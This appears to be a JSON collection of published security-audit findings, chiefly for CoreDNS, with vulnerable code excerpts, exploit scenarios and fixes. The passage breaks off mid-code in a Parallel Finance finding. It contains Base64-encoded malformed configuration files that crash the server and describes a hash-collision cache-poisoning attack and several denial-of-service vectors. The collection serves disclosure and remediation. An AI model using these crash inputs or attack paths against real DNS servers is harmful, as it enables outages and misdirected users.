        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "The events declared in the Fraxferry contract could be improved to be more useful to users and monitoring systems. Certain events could be more useful if they used the indexed keyword. For example, in the Embark event, the indexed keyword could be applied to the sender parameter. Additionally, SetCaptain , SetFirstOfficier , SetFee , and SetMinWaitPeriods could be more useful if they emitted the previous value in addition to the newly set one. event Embark ( address sender , uint index , uint amount , uint amountAfterFee , uint timestamp ); event Disembark ( uint start , uint end , bytes32 hash ); event Depart ( uint batchNo , uint start , uint end , bytes32 hash ); event RemoveBatch ( uint batchNo ); event DisputeBatch ( uint batchNo , bytes32 hash ); event Cancelled ( uint index , bool cancel ); event Pause ( bool paused ); event OwnerNominated ( address newOwner ); event OwnerChanged ( address previousOwner , address newOwner ); event SetCaptain ( address newCaptain ); event SetFirstOfficer ( address newFirstOfficer ); event SetCrewmember ( address crewmember , bool set ); event SetFee ( uint fee ); event SetMinWaitPeriods ( uint minWaitAdd , uint minWaitExecute ); Figure 13.1: Events declared in Fraxferry.sol#L83-L96 Recommendations Short term, add the indexed keyword to any events that could benet from it; modify events that report on setter operations so that they report the previous values in addition to the newly set values.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Risk of a race condition in the secondary plugins setup function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "When it fails to transfer a zone from another server, the setup function of the secondary plugin prints a message to standard output. It obtains the name of the zone, stored in the variable n , from a loop and prints the message in an anonymous inner goroutine. However, the variable is not copied before being used in the anonymous goroutine, and the value that n points to is likely to change by the time the scheduler executes the goroutine. Consequently, the value of n will be inaccurate when it is printed. 19 24 26 27 29 30 31 32 35 36 40 func setup(c *caddy.Controller) error { // (...). for _, n := range zones.Names { // (...) c.OnStartup( func () error { z.StartupOnce.Do( func () { go func () { // (...) for { // (...) log.Warningf( \"All '%s' masters failed to transfer, retrying in %s: %s\" , n , dur.String(), err) // (...) 41 46 47 48 49 50 51 52 53 } } } z.Update() }() }) return nil }) Figure 1.1: The value of n is not copied before it is used in the anonymous goroutine and could be logged incorrectly. ( plugin/secondary/setup.go#L19-L53 ) Exploit Scenario An operator of a CoreDNS server enables the secondary plugin. The operator sees an error in the standard output indicating that the zone transfer failed. However, the error points to an invalid zone, making it more dicult for the operator to troubleshoot and x the issue. Recommendations Short term, create a copy of n before it is used in the anonymous goroutine. See Appendix B for a proof of concept demonstrating this issue and an example of the x. Long term, integrate  anonymous-race-condition Semgrep rule into the CI/CD pipeline to catch this type of race condition.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "2. Upstream errors captured in the grpc plugin are not returned ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "In the ServeDNS implementation of the grpc plugin, upstream errors are captured in a loop. However, once an error is captured in the upstreamErr variable, the function exits with a nil error; this is because there is no break statement forcing the function to exit the loop and to reach a return statement, at which point it would return the error value. The ServeDNS function of the forward plugin includes a similar but correct implementation. func (g *GRPC) ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) ( int , error ) { // (...) upstreamErr = err // Check if the reply is correct; if not return FormErr. if !state.Match(ret) { debug.Hexdumpf(ret, \"Wrong reply for id: %d, %s %d\" , ret.Id, state.QName(), state.QType()) formerr := new (dns.Msg) formerr.SetRcode(state.Req, dns.RcodeFormatError) w.WriteMsg(formerr) return 0 , nil } w.WriteMsg(ret) return 0 , nil } if upstreamErr != nil { return dns.RcodeServerFailure, upstreamErr } Figure 2.1: plugin/secondary/setup.go#L19-L53 Exploit Scenario An operator runs CoreDNS with the grpc plugin. Upstream errors cause the gRPC functionality to fail. However, because the errors are not logged, the operator remains unaware of their root cause and has diculty troubleshooting and remediating the issue. Recommendations Short term, correct the ineectual assignment to ensure that errors captured by the plugin are returned. Long term, integrate ineffassign into the CI/CD pipeline to catch this and similar issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "3. Index-out-of-range panic in autopath plugin initialization ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "The following syntax is used to congure the autopath plugin: autopath [ZONE...] RESOLV-CONF The RESOLV-CONF parameter can point to a resolv.conf(5) conguration le or to another plugin, if the string in the resolv variable is prexed with an @ symbol (e.g., @kubernetes). However, the autoPathParse function does not ensure that the length of the RESOLV-CONF parameter is greater than zero before dereferencing its rst element and comparing it with the @ character. func autoPathParse(c *caddy.Controller) (*AutoPath, string , error ) { ap := &AutoPath{} mw := \"\" for c.Next() { zoneAndresolv := c.RemainingArgs() if len (zoneAndresolv) < 1 { return ap, \"\" , fmt.Errorf( \"no resolv-conf specified\" ) } resolv := zoneAndresolv[ len (zoneAndresolv)- 1 ] if resolv[ 0 ] == '@' { mw = resolv[ 1 :] Figure 3.1: The length of resolv may be zero when the rst element is checked. ( plugin/autopath/setup.go#L45-L54 ) Specifying a conguration le with a zero-length RESOLV-CONF parameter, as shown in gure 3.2, would cause CoreDNS to panic. 0 autopath \"\" Figure 3.2: An autopath conguration with a zero-length RESOLV-CONF parameter panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/autopath.autoPathParse(0xc000518870) /home/ubuntu/audit-coredns/client-code/coredns/plugin/autopath/setup.go:53 +0x35c github.com/coredns/coredns/plugin/autopath.setup(0xc000518870) /home/ubuntu/audit-coredns/client-code/coredns/plugin/autopath/setup.go:16 +0x33 github.com/coredns/caddy.executeDirectives(0xc00029eb00, {0x7ffdc770671b, 0x8}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc000543260, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x22394b8, 0xc0003e8a00}, 0xc0003e8a00, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x22394b8, 0xc0003e8a00}, 0xc00029eb00, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x22394b8, 0xc0003e8a00}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 3.3: CoreDNS panics when loading the autopath conguration. Exploit Scenario An operator of a CoreDNS server provides an empty RESOLV-CONF parameter when conguring the autopath plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the resolv variable is a non-empty string before indexing it. Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe denial of service (DoS).",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "4. Index-out-of-range panic in forward plugin initialization ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "Initializing the forward plugin involves parsing the relevant conguration section. func parseStanza(c *caddy.Controller) (*Forward, error ) { f := New() if !c.Args(&f.from) { return f, c.ArgErr() } origFrom := f.from zones := plugin.Host(f.from).NormalizeExact() f.from = zones[ 0 ] // there can only be one here, won't work with non-octet reverse Figure 4.1: The length of the zones variable may be zero when the rst element is checked. ( plugin/forward/setup.go#L89-L97 ) An invalid conguration le for the forward plugin could cause the zones variable to have a length of zero. A Base64-encoded example of such a conguration le is shown in gure 4.2. Lgpmb3J3YXJkIE5vTWF0Pk69VL0vvVN0ZXJhbENoYXJDbGFzc0FueUNoYXJOb3ROTEEniez6bnlDaGFyQmVnaW5MaW5l RW5kTGluZUJlZ2luVGV4dEVuZFRleHRXb3JkQm91bmRhcnlOb1dvYXRpbmcgc3lzdGVtIDogImV4dCIsICJ4ZnMiLCAi bnRTaW50NjRLaW5kZnMiLiB5IGluZmVycmVkIHRvIGJlIGV4dCBpZiB1bnNwZWNpZmllZCBlIDogaHR0cHM6Di9rdWJl cm5ldGVzaW9kb2NzY29uY2VwdHNzdG9yYWdldm9sdW1lcyMgIiIiIiIiIiIiIiIiJyCFmIWlsZj//4WuhZilr4WY5bCR mPCd Figure 4.2: The Base64-encoded forward conguration le Specifying a conguration le like that shown above would cause CoreDNS to panic when attempting to access the rst element of zones : panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/forward.parseStanza(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:97 +0x972 github.com/coredns/coredns/plugin/forward.parseForward(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:81 +0x5e github.com/coredns/coredns/plugin/forward.setup(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:22 +0x33 github.com/coredns/caddy.executeDirectives(0xc0000ea800, {0x7ffdf9f6e6ed, 0x36}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc00056a860, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x22394b8, 0xc00024ea80}, 0xc00024ea80, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x22394b8, 0xc00024ea80}, 0xc0000ea800, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x22394b8, 0xc00024ea80}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 4.3: CoreDNS panics when loading the forward conguration. Exploit Scenario An operator of a CoreDNS server miscongures the forward plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the zones variable has the correct number of elements before indexing it. Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe DoS.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "5. Use of deprecated PreferServerCipherSuites eld ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "In the setTLSDefaults function of the tls plugin, the TLS conguration object includes a PreferServerCipherSuites eld, which is set to true . func setTLSDefaults(tls *ctls.Config) { tls.MinVersion = ctls.VersionTLS12 tls.MaxVersion = ctls.VersionTLS13 tls.CipherSuites = [] uint16 { ctls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305, ctls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305, ctls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, ctls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, ctls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, } tls.PreferServerCipherSuites = true } Figure 5.1: plugin/tls/tls.go#L22-L37 In the past, this property controlled whether a TLS connection would use the cipher suites preferred by the server or by the client. However, as of Go 1.17, this eld is ignored. According to the Go documentation for crypto/tls , Servers now select the best mutually supported cipher suite based on logic that takes into account inferred client hardware, server hardware, and security. When CoreDNS is built using a recent Go version, the use of this property is redundant and may lead to false assumptions about how cipher suites are negotiated in a connection to a CoreDNS server. Recommendations Short term, add this issue to the internal issue tracker. Additionally, when support for Go versions older than 1.17 is entirely phased out of CoreDNS, remove the assignment to the deprecated PreferServerCipherSuites eld.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "6. Use of the MD5 hash function to detect Corele changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "The reload plugin is designed to automatically detect changes to a Corele and to reload it if necessary. To determine whether a le has changed, the plugin periodically compares the current MD5 hash of the le to the last hash calculated for it ( plugin/reload/reload.go#L81-L107 ). If the values are dierent, it reloads the Corele. However, the MD5 hash functions vulnerability to collisions decreases the reliability of this process; if two dierent les produce the same hash value, the plugin will not detect the dierence between them. Exploit Scenario An operator of a CoreDNS server modies a Corele, but the MD5 hash of the modied le collides with that of the old le. As a result, the reload plugin does not detect the change. Instead, it continues to use the outdated server conguration without alerting the operator to its use. Recommendations Short term, improve the robustness of the reload plugin by using the SHA-512 hash function instead of MD5.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Use of default math/rand seed in grpc and forward plugins random server-selection policy ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "The grpc and forward plugins use the random policy for selecting upstream servers. The implementation of this policy in the two plugins is identical and uses the math/rand package from the Go standard library. func (r *random) List(p []*Proxy) []*Proxy { switch len (p) { case 1 : return p case 2 : if rand.Int()% 2 == 0 { return []*Proxy{p[ 1 ], p[ 0 ]} // swap } return p } perms := rand.Perm( len (p)) rnd := make ([]*Proxy, len (p)) for i, p1 := range perms { rnd[i] = p[p1] } return rnd } Figure 7.1: plugin/grpc/policy.go#L19-L37 As highlighted in gure 7.1, the random policy uses either rand.Int or rand.Perm to choose the order of the upstream servers, depending on the number of servers that have been congured. Unless a program using the random policy explicitly calls rand.Seed , the top-level functions rand.Int and rand.Perm behave as if they were seeded with the value 1 , which is the default seed for math/rand . CoreDNS does not call rand.Seed to seed the global state of math/rand . Without this call, the grpc and forward plugins random selection of upstream servers is likely to be trivially predictable and the same every time CoreDNS is restarted. Exploit Scenario An attacker targets a CoreDNS instance in which the grpc or forward plugin is enabled. The attacker exploits the deterministic selection of upstream servers to overwhelm a specic server, with the goal of causing a DoS condition or performing an attack such as a timing attack. Recommendations Short term, instantiate a rand.Rand type with a unique seed, rather than drawing random numbers from the global math/rand state. CoreDNS takes this approach in several other areas, such as the loop plugin .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Cache plugin does not account for hash table collisions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "To cache a DNS reply, CoreDNS maps the FNV-1 hash of the query name and type to the content of the reply in a hash table entry. func key(qname string , m *dns.Msg, t response.Type) ( bool , uint64 ) { // We don't store truncated responses. if m.Truncated { return false , 0 } // Nor errors or Meta or Update. if t == response.OtherError || t == response.Meta || t == response.Update { return false , 0 } return true , hash(qname, m.Question[ 0 ].Qtype) } func hash(qname string , qtype uint16 ) uint64 { h := fnv.New64() h.Write([] byte { byte (qtype >> 8 )}) h.Write([] byte { byte (qtype)}) h.Write([] byte (qname)) return h.Sum64() } Figure 8.1: plugin/cache/cache.go#L68-L87 To check whether there is a cached reply for an incoming query, CoreDNS performs a hash table lookup for the query name and type. If it identies a reply with a valid time to live (TTL), it returns the reply. CoreDNS assumes the stored DNS reply to be the correct one for the query, given the use of a hash table mapping. However, this assumption is faulty, as FNV-1 is a non-cryptographic hash function that does not oer collision resistance, and there exist utilities for generating colliding inputs to FNV-1 . As a result, it is likely possible to construct a valid (qname , qtype) pair that collides with another one, in which case CoreDNS could serve the incorrect cached reply to a client. Exploit Scenario An attacker aiming to poison the cache of a CoreDNS server generates a valid (qname* , qtype*) pair whose FNV-1 hash collides with a commonly queried (qname , qtype) pair. The attacker gains control of the authoritative name server for qname* and points its qtype* record to an address of his or her choosing. The attacker also congures the server to send a second record when (qname* , qtype*) is queried: a qtype record for qname that points to a malicious address. The attacker queries the CoreDNS server for (qname* , qtype*) , and the server caches the reply with the malicious address. Soon thereafter, when a legitimate user queries the server for (qname , qtype) , CoreDNS serves the user the cached reply for (qname* , qtype*) , since it has an identical FNV-1 hash. As a result, the legitimate users DNS client sees the malicious address as the record for qname . Recommendations Short term, store the original name and type of a query in the value of a hash table entry. After looking up the key for an incoming request in the hash table, verify that the query name and type recorded alongside the cached reply match those of the request. If they do not, disregard the cached reply. Short term, use the keyed hash function SipHash instead of FNV-1. SipHash was designed for speed and derives a 64-bit output value from an input value and a 128-bit secret key; this method adds pseudorandomness to a hash table key and makes it more dicult for an attacker to generate collisions oine. CoreDNS should use the crypto/rand package from Gos standard library to generate a cryptographically random secret key for SipHash on startup.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "9. Index-out-of-range reference in kubernetes plugin ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "The parseRequest function of the kubernetes plugin parses a DNS request before using it to query Kubernetes. By fuzzing the function, we discovered an out-of-range issue that can cause a panic. The issue occurs when the function calls stripUnderscore with an empty string, as it does when it receives a request with the qname .o.o.po.pod.8 and the zone interwebs. // stripUnderscore removes a prefixed underscore from s. func stripUnderscore(s string ) string { if s[ 0 ] != '_' { return s } return s[ 1 :] } Figure 9.1: plugin/kubernetes/parse.go#L97 Because of the time constraints of the audit, we could not nd a way to directly exploit this vulnerability. Although certain tools for sending DNS queries, like dig and host , verify the validity of a host before submitting a DNS query, it may be possible to exploit the vulnerability by using custom tooling or DNS over HTTPs (DoH). Exploit Scenario An attacker nds a way to submit a query with an invalid host (such as o.o.po.pod.8) to a CoreDNS server running as the DNS server for a Kubernetes endpoint. Because of the index-out-of-range bug, the kubernetes plugin causes CoreDNS to panic and crash, resulting in a DoS. Recommendations Short term, to prevent a panic, implement a check of the value of the string passed to the stripUnderscore function.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "10. Calls to time.After() in select statements can lead to memory leaks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "Calls to the time.After function in select/case statements within for loops can lead to memory leaks. This is because the garbage collector does not clean up the underlying Timer object until the timer has red. A new timer is initialized at the start of each iteration of the for loop (and therefore with each select statement), which requires resources. As a result, if many routines originate from a time.After call, the system may experience memory overconsumption. for { select { case <-ctx.Done(): log.Debugf( \"Breaking out of CloudDNS update loop for %v: %v\" , h.zoneNames, ctx.Err()) return case <-time.After( 1 * time.Minute) : if err := h.updateZones(ctx); err != nil && ctx.Err() == nil /* Don't log error if ctx expired. */ { log.Errorf( \"Failed to update zones %v: %v\" , h.zoneNames, err) } Figure 10.1: A time.After() routine that causes a memory leak ( plugin/clouddns/clouddns.go#L85-L93 ) The following portions of the code contain similar patterns:  plugin/clouddns/clouddns.go#L85-L93  plugin/azure/azure.go#L87-96  plugin/route53/route53.go#87-96 Exploit Scenario An attacker nds a way to overuse a function, which leads to overconsumption of a CoreDNS servers memory and a crash. Recommendations Short term, use a ticker instead of the time.After function in select/case statements included in for loops. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, avoid using the time.After method in for-select routines and periodically use a Semgrep query to detect similar patterns in the code. References  DevelopPaper post on the memory leak vulnerability in time.After   Golang <-time.After() Is Not Garbage Collected before Expiry  (Medium post)",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Incomplete list of debugging data exposed by the prometheus plugin ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "Enabling the prometheus (metrics) plugin exposes an HTTP endpoint that lists CoreDNS metrics. The documentation for the plugin indicates that it reports data such as the total number of queries and the size of responses. However, other data that is reported by the plugin (and also available through the pprof plugin) is not listed in the documentation. This includes Go runtime debugging information such as the number of running goroutines and the duration of Go garbage collection runs. Because this data is not listed in the prometheus plugin documentation, operators may initially be unaware of its exposure. Moreover, the data could be instrumental in formulating an attack. # TYPE go_gc_duration_seconds summary go_gc_duration_seconds{quantile=\"0\"} 4.4756e-05 go_gc_duration_seconds{quantile=\"0.25\"} 6.0522e-05 go_gc_duration_seconds{quantile=\"0.5\"} 7.1476e-05 go_gc_duration_seconds{quantile=\"0.75\"} 0.000105802 go_gc_duration_seconds{quantile=\"1\"} 0.000205775 go_gc_duration_seconds_sum 0.010425592 go_gc_duration_seconds_count 123 # HELP go_goroutines Number of goroutines that currently exist. # TYPE go_goroutines gauge go_goroutines 18 # HELP go_info Information about the Go environment. # TYPE go_info gauge go_info{version=\"go1.17.3\"} 1 # HELP go_memstats_alloc_bytes Number of bytes allocated and still in use. # TYPE go_memstats_alloc_bytes gauge Figure 11.1: Examples of the data exposed by prometheus and omitted from the documentation Exploit Scenario An attacker discovers the metrics exposed by CoreDNS over port 9253. The attacker then monitors the endpoint to determine the eectiveness of various attacks in crashing the server. Recommendations Short term, document all data exposed by the prometheus plugin. Additionally, consider changing the data exposed by the prometheus plugin to exclude Go runtime data available through the pprof plugin.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Cloud integrations require cleartext storage of keys in the Corele ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "The route53 , azure , and clouddns plugins enable CoreDNS to interact with cloud providers (AWS, Azure, and the Google Cloud Platform (GCP), respectively). To access clouddns , a user enters the path to the le containing his or her GCP credentials. When using route53 , CoreDNS pulls the AWS credentials that the user has entered in the Corele. If the AWS credentials are not included in the Corele, CoreDNS will pull them in the same way that the AWS command-line interface (CLI) would. While operators have options for the way that they provide AWS and GCP credentials, Azure credentials must be pulled directly from the Corele. Furthermore, the CoreDNS documentation lacks guidance on the risks of storing AWS, Azure, or GCP credentials in local conguration les . Exploit Scenario An attacker or malicious internal user gains access to a server running CoreDNS. The malicious actor then locates the Corele and obtains credentials for a cloud provider, thereby gaining access to a cloud infrastructure. Recommendations Short term, remove support for entering cloud provider credentials in the Corele in cleartext. Instead, load credentials for each provider in the manner recommended in that providers documentation and implemented by its CLI utility. CoreDNS should also refuse to load credential les with overly broad permissions and warn users about the risks of such les.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Lack of rate-limiting controls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "CoreDNS does not enforce rate limiting of DNS queries, including those sent via DoH. As a result, we were able to issue the same request thousands of times in less than one minute over the HTTP endpoint /dns-query . Figure 13.1: We sent 3,424 requests to CoreDNS without being rate limited. During our tests, the lack of rate limiting did not appear to aect the application. However, processing requests sent at such a high rate can consume an inordinate amount of host resources, and a lack of rate limiting can facilitate DoS and DNS amplication attacks. Exploit Scenario An attacker oods a CoreDNS server with HTTP requests, leading to a DoS condition. Recommendations Short term, consider incorporating the rrl plugin, used for the rate limiting of DNS queries, into the CoreDNS codebase. Additionally, implement rate limiting on all API endpoints. An upper bound can be applied at a high level to all endpoints exposed by CoreDNS. Long term, run stress tests to ensure that the rate limiting enforced by CoreDNS is robust.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. Lack of a limit on the size of response bodies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "The ioutil.ReadAll function reads from a source input until encountering an error or the end of the le, at which point it returns the data that it read. The toMsg function, which processes requests for the HTTP server, uses ioutil.ReadAll to parse requests and to read POST bodies. However, there is no limit on the size of request bodies. Using ioutil.ReadAll to parse a large request that is loaded multiple times may exhaust the systems memory, causing a DoS. func toMsg(r io.ReadCloser) (*dns.Msg, error ) { buf, err := io.ReadAll(r) if err != nil { return nil , err } m := new (dns.Msg) err = m.Unpack(buf) return m, err } Figure 14.1: plugin/pkg/doh/doh.go#L94-L102 Exploit Scenario An attacker generates multiple POST requests with long request bodies to /dns-query , leading to the exhaustion of its resources. Recommendations Short term, use the io.LimitReader function or another mechanism to limit the size of request bodies. Long term, consider implementing application-wide limits on the size of request bodies to prevent DoS attacks.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Index-out-of-range panic in grpc plugin initialization ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "description": "Initializing the grpc plugin involves parsing the relevant conguration section. func parseStanza(c *caddy.Controller) (*GRPC, error ) { g := newGRPC() if !c.Args(&g.from) { return g, c.ArgErr() } g.from = plugin.Host(g.from).NormalizeExact()[ 0 ] // only the first is used. Figure 15.1: plugin/grpc/setup.go#L53-L59 An invalid conguration le for the grpc plugin could cause the call to NormalizeExtract (highlighted in gure 15.1) to return a value with zero elements. A Base64-encoded example of such a conguration le is shown below. MApncnBjIDAwMDAwMDAwMDAwhK2FhYKtMIStMITY2NnY2dnY7w== Figure 15.2: The Base64-encoded grpc conguration le Specifying a conguration le like that in gure 15.2 would cause CoreDNS to panic when attempting to access the rst element of the return value. panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/grpc.parseStanza(0xc0002f0900) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:59 +0x31b github.com/coredns/coredns/plugin/grpc.parseGRPC(0xc0002f0900) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:45 +0x5e github.com/coredns/coredns/plugin/grpc.setup(0x1e4dcc0) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:17 +0x30 github.com/coredns/caddy.executeDirectives(0xc0000e2900, {0x7ffc15b696e0, 0x31}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc000269300, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x2239518, 0xc0002b2980}, 0xc0002b2980, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x2239518, 0xc0002b2980}, 0xc0000e2900, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x2239518, 0xc0002b2980}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 15.3: CoreDNS panics when loading the grpc conguration. Exploit Scenario An operator of a CoreDNS server miscongures the grpc plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the variable returned by NormalizeExtract has at least one element before indexing it. Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe DoS. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Vulnerable dependencies in the Substrate parachain ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "description": "The Parallel Finance parachain node uses the following dependencies with known vulnerabilities. (All of the dependencies listed are inherited from the Substrate framework.) Dependency Version ID",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Users can avoid accruing interest by repaying a zero amount ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "description": "To repay borrowed funds, users call the repay_borrow extrinsic. The extrinsic implementation calls the Pallet::repay_borrow_internal method to recompute the loan balance. Pallet::repay_borrow_internal updates the loan balance for the account and resets the borrow index as part of the calculation. fn repay_borrow_internal ( borrower: & T ::AccountId, asset_id: AssetIdOf <T>, account_borrows: BalanceOf <T>, repay_amount: BalanceOf <T>, ) -> DispatchResult { // ... <redacted> AccountBorrows::<T>::insert( asset_id, borrower, BorrowSnapshot { principal: account_borrows_new , borrow_index: Self ::borrow_index(asset_id) , }, ); TotalBorrows::<T>::insert(asset_id, total_borrows_new); Ok (()) } Figure 2.1: pallets/loans/src/lib.rs:1057-1087 The borrow index is used in the calculation of the accumulated interest for the loan in Pallet::current_balance_from_snapshot . Specically, the outstanding balance, snapshot.principal , is multiplied by the quotient of borrow_index divided by snapshot.borrow_index . pub fn current_balance_from_snapshot ( asset_id: AssetIdOf <T>, snapshot: BorrowSnapshot <BalanceOf<T>>, ) -> Result <BalanceOf<T>, DispatchError> { if snapshot.principal.is_zero() || snapshot.borrow_index.is_zero() { return Ok (Zero::zero()); } // Calculate new borrow balance using the interest index: // recent_borrow_balance = snapshot.principal * borrow_index / // snapshot.borrow_index let recent_borrow_balance = Self ::borrow_index(asset_id) 